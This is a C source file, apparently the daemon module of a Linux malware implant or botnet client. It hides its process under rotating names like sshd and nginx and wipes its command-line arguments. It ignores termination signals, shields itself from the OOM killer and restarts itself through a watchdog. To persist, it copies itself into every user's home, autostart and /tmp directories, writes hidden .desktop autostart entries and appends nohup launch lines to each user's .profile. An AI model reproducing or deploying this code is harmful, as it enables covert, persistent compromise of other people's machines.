#define _GNU_SOURCE

#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <dirent.h>
#include <time.h>
#include <ctype.h>
#include <errno.h>
#include <limits.h>
#include <pwd.h>
#include <grp.h>
#include "headers/daemon.h"

void explicit_bzero(void *p, size_t n) {
    volatile unsigned char *vp = (volatile unsigned char *)p;
    while (n--) {
        *vp++ = 0;
    }
}

//extra file edit from pull request #3
static const char* get_random_name(void) {
    static const char *names[] = {
        "update", "cache", "cron", "logs",
        "backup", "sync", "monitor", "db",
        "net", "service", "daemon", "worker"
    };
    static const size_t names_count = sizeof(names) / sizeof(names[0]);
    return names[rand() % names_count];
}

static int safe_strncpy(char *dest, const char *src, size_t size) {
    if (!dest || !src || size == 0) return -1;
    size_t len = strlen(src);

    if (len >= size) {
        return -1;
    }
    memcpy(dest, src, len);
    dest[len] = '\0';
    return 0;
}

static int join_path(char *dest, size_t dest_size, const char *dir, const char *file) {
    if (!dest || !dir || !file || dest_size == 0) return -1;

    int written = snprintf(dest, dest_size, "%s/%s", dir, file);
    if (written < 0 || (size_t)written >= dest_size) {
        if (dest_size > 0) dest[0] = '\0';
        return -1;
    }
    return 0;
}

static const char *process_names[] = {
    "cache", "sshd", "bash", "crond",
    "nginx", "postgres", "apache", "mysql",
    "python", "node", "redis", "memcached"
};
static const size_t process_names_count = sizeof(process_names) / sizeof(process_names[0]);

static void protect_process(void) {
    struct rlimit limit = {RLIM_INFINITY,RLIM_INFINITY};
    setrlimit(RLIMIT_AS, &limit);
    setrlimit(RLIMIT_MEMLOCK, &limit);
    setrlimit(RLIMIT_NPROC, &limit);
    setrlimit(RLIMIT_NOFILE, &limit);
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_NAME, (unsigned long)get_random_name());
    prctl(PR_SET_CHILD_SUBREAPER, 1);
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    int fd = open("/proc/self/oom_score_adj", O_WRONLY);
    if(fd >= 0) {if(write(fd,"-1000\n",6) != 6) goto done; done: close(fd);}
    setpriority(PRIO_PROCESS, 0, -20);
    struct sigaction sa = {.sa_handler = SIG_IGN, .sa_flags = SA_RESTART|SA_NOCLDWAIT};
    sigfillset(&sa.sa_mask);
    int signals[] = {SIGTERM,SIGINT,SIGQUIT,SIGHUP,SIGTSTP,SIGUSR1,SIGUSR2,SIGALRM,SIGPIPE,SIGCHLD,SIGCONT,SIGABRT,SIGTRAP,SIGBUS,SIGFPE,SIGILL,SIGSEGV,SIGSYS,SIGXCPU,SIGXFSZ,SIGVTALRM,SIGPROF,SIGPWR,SIGURG,SIGWINCH,SIGIO,SIGTTIN,SIGTTOU};
    for (int i = 0; i < sizeof(signals)/sizeof(signals[0]); i++) sigaction(signals[i], &sa, NULL);
}

void* rename_process(void* arg __attribute__((unused))) {
    static unsigned int last_name_index = 0;
    while (1) {
        unsigned int name_index = (rand() % process_names_count);
        if (name_index == last_name_index) {
            name_index = (name_index + 1) % process_names_count;
        }
        const char* new_name = process_names[name_index];
        char* env_ptr = (char*)getenv("_");
        if (env_ptr) {
            size_t env_val_len = strlen(env_ptr);
            safe_strncpy(env_ptr, new_name, env_val_len + 1);
            prctl(PR_SET_NAME, new_name);
        }
        last_name_index = name_index;
        sleep(8);
    }
    return NULL;
}

int copy_file(const char *src, const char *dst) {
    char buf[1024];
    size_t size;

    FILE* source = fopen(src, "rb");
    if (!source) {
        return -1;
    }

    FILE* dest = fopen(dst, "wb");
    if (!dest) {
        fclose(source);
        return -1;
    }

    while ((size = fread(buf, 1, 1024, source)) > 0) {
        fwrite(buf, 1, size, dest);
    }

    fclose(source);
    fclose(dest);

    return chmod(dst, S_IRWXU | S_IRWXG | S_IRWXO);
}

void run_clone(const char *path, int argc, char** argv) {
    if (!path || !argv) {
        return;
    }
    
    pid_t pid = fork();
    if (pid == -1) {
        return;
    }
    if (pid == 0) {
        overwrite_argv(argc, argv);
        execl(path, path, (char *)NULL);
        _exit(EXIT_SUCCESS);
    }
}

void handle_watchdog_error() {
    pid_t pid = fork();
    if (pid == -1) {
        return;
    }
    if (pid == 0) {
        execl("/proc/self/exe", "init", NULL);
        _exit(1);
    }
}

void* watchdog(void* arg) {
    (void)arg;
    
    time_t last = time(NULL);
    char exe[PATH_MAX];
    long max_rss_kb = 250000; // 250MB limit

    ssize_t rlen = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (rlen < 0) {
        handle_watchdog_error();
        return NULL;
    }
    exe[rlen] = '\0';
    
    while (1) {
        FILE* f = fopen("/proc/self/status", "r");
        if (f) {
            char* line = NULL;
            size_t len = 0;
            ssize_t read;
            
            while ((read = getline(&line, &len, f)) != -1) {
                if (strstr(line, "VmRSS:")) {
                    long rss = 0;
                    if (sscanf(line, "VmRSS: %ld", &rss) == 1 && rss > max_rss_kb) {
                        if (execl(exe, "init", NULL) == -1) {
                            handle_watchdog_error();
                        }
                        _exit(1);
                    }
                    break;
                }
            }
            
            free(line);
            fclose(f);
        }
        
        if (time(NULL) - last > 300) {
            if (execl(exe, "init", NULL) == -1) {
                handle_watchdog_error();
            }
            _exit(1);
        }
        
        sleep(30);
    }
    
    return NULL;
}

int startup_persist(const char *source_path) { //2
    if (!source_path) return -1;

    static const char *home_dirs[] = {
        "/home",
        "/root",
        "/var/home",
        "/var/lib",
        "/var/run"
    };
    
    static const char *startup_locations[] = {
        "/.config/autostart",
        "/.local/bin",
        "/.cache",
        "/tmp"
    };
    
    static const int home_dirs_count = sizeof(home_dirs) / sizeof(home_dirs[0]);
    static const int startup_locations_count = sizeof(startup_locations) / sizeof(startup_locations[0]);
    
    char temp_path[PATH_MAX] = {0};
    static const char *autostart_str = "autostart";

    for (int i = 0; i < home_dirs_count; i++) {
        DIR *dir = opendir(home_dirs[i]);
        if (!dir) continue;
        
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type != DT_DIR || entry->d_name[0] == '.') continue;
            
            for (int j = 0; j < startup_locations_count; j++) {
                char dest_dir[PATH_MAX] = {0};
                unsigned int rand_val = (unsigned int)rand() ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
                
                if (join_path(temp_path, sizeof(temp_path), home_dirs[i], entry->d_name) != 0) continue;
                if (join_path(dest_dir, sizeof(dest_dir), temp_path, startup_locations[j] + 1) != 0) continue;
                
                if (mkdir(dest_dir, 0755) != 0 && errno != EEXIST) continue;
                
                char dest_path[PATH_MAX] = {0};
                const char* name = get_random_name();
                size_t remaining_dest_path = sizeof(dest_path);
                int written_dest_path = snprintf(dest_path, remaining_dest_path, "%s/%s_%x", dest_dir, name, rand_val);
                if (written_dest_path < 0 || (size_t)written_dest_path >= remaining_dest_path) continue;
                
                if (access(dest_path, F_OK) == 0) continue;
                
                if (copy_file(source_path, dest_path) == 0) {
                    if (strstr(dest_dir, autostart_str)) {
                        char desktop_path[PATH_MAX] = {0};
                        if (join_path(desktop_path, sizeof(desktop_path), dest_dir, "updater.desktop") == 0) {
                            FILE *f = fopen(desktop_path, "w");
                            if (f) {
                                fprintf(f, "[Desktop Entry]\nType=Application\nName=%s\nExec=%s\nHidden=true\nX-GNOME-Autostart-enabled=true\n", 
                                    name, dest_path);
                                fclose(f);
                                chmod(desktop_path, 0644);
                            }
                        }
                    }
                    
                    chmod(dest_path, S_IRUSR | S_IWUSR | S_IXUSR);
                    
                    char profile_path[PATH_MAX] = {0};
                    if (join_path(temp_path, sizeof(temp_path), home_dirs[i], entry->d_name) == 0 &&
                        join_path(profile_path, sizeof(profile_path), temp_path, ".profile") == 0) {
                        
                        int entry_exists = 0;
                        FILE *check = fopen(profile_path, "r");
                        if (check) {
                            char line[PATH_MAX]; 
                            while (fgets(line, sizeof(line), check)) {
                                line[strcspn(line, "\n")] = 0;
                                if (strcmp(line, dest_path) == 0) {
                                    entry_exists = 1;
                                    break;
                                }
                            }
                            fclose(check);
                        }

                        if (!entry_exists) {
                            FILE *profile = fopen(profile_path, "a");
                            if (profile) {
                                fprintf(profile, "\n(nohup %s >/dev/null 2>&1 &)\n", dest_path);
                                fclose(profile);
                            }
                        }
                    }
                }
            }
        }
        closedir(dir);
    }
    return 0;
}

void signal_handler(int sig) {
    if (sig == SIGTERM || sig == SIGINT) {
        signal(sig, signal_handler);
        return;
    }
}

void setup_signal_handlers() {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = signal_handler;
    sigfillset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;

    int signals[] = {
        SIGTERM, SIGINT, SIGQUIT, SIGHUP, SIGTSTP, 
        SIGUSR1, SIGUSR2, SIGALRM, SIGPIPE
    };
    int num_signals = sizeof(signals) / sizeof(signals[0]);

    for (int i = 0; i < num_signals; i++) {
        if (sigaction(signals[i], &sa, NULL) != 0) {
            continue;
        }
    }
}

void overwrite_argv(int argc, char** argv) {
    if (!argv || argc <= 0 || !argv[0]) {
        return;
    }

    char* argv0_ptr = argv[0];
    size_t argv0_len = strlen(argv[0]);

    for (int i = 0; i < argc && argv[i] != NULL; i++) {
        size_t current_arg_len = (argv[i] == argv0_ptr) ? argv0_len : strlen(argv[i]);
        if (current_arg_len > 0) {
            explicit_bzero(argv[i], current_arg_len);
        }
    }

    if (argv0_len > 0) { 
        snprintf(argv0_ptr, argv0_len, "init");
    }
}

static void protect_process(void);

void daemonize(int argc, char** argv) {
    pid_t pid = fork();
    if (pid < 0) return; 
    if (pid > 0) _exit(0);  

    if (setsid() < 0) {
        perror("setsid failed");
        return;
    }

    if (chdir("/") != 0) {
        perror("chdir failed");
    }

    umask(0);
    struct rlimit rlim;
    rlim_t max_fd = 1024;
    if (getrlimit(RLIMIT_NOFILE, &rlim) == 0) {
        max_fd = rlim.rlim_cur;
    }

    for (rlim_t i = 0; i < max_fd; i++) {
        if (i != STDIN_FILENO && i != STDOUT_FILENO && i != STDERR_FILENO) {
            close((int)i);
        }
    }

    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        if (dup2(fd, STDIN_FILENO) < 0) {
            perror("Failed to redirect stdin");
        }
        if (dup2(fd, STDOUT_FILENO) < 0) {
            perror("Failed to redirect stdout");
        }
        if (dup2(fd, STDERR_FILENO) < 0) {
            perror("Failed to redirect stderr");
        }
        if (fd > STDERR_FILENO) {
            close(fd);
        }
    } else {
        perror("Failed to open /dev/null");
    }

    protect_process();
    pthread_attr_t attr;
    if (pthread_attr_init(&attr) == 0) {
        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED) == 0) {
            pthread_t watcher;
            pthread_create(&watcher, &attr, watchdog, NULL);
        }
        pthread_attr_destroy(&attr);
    }
    srand((unsigned int)(time(NULL) ^ (getpid() << 16)));
    if (argv != NULL) {
        overwrite_argv(argc, argv);
    }
}
